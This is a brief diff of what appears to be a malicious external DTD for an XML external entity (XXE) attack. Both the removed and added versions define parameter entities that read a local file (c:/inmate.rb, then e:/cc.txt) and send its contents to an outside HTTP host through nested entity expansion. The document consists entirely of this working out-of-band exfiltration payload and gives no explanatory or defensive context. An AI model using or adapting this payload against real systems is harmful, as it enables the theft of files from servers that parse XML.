@@ -1,2 +1,4 @@
-<!ENTITY % data SYSTEM “file:///c:/inmate.rb”>
-<!ENTITY % ext “<!ENTITY hehe SYSTEM ‘http://128.199.141.142/?%data;'>">
+<!ENTITY % file SYSTEM "file:///e:/cc.txt">
+        <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.56.17/%file;'>">
+        %eval;
+        %exfiltrate;
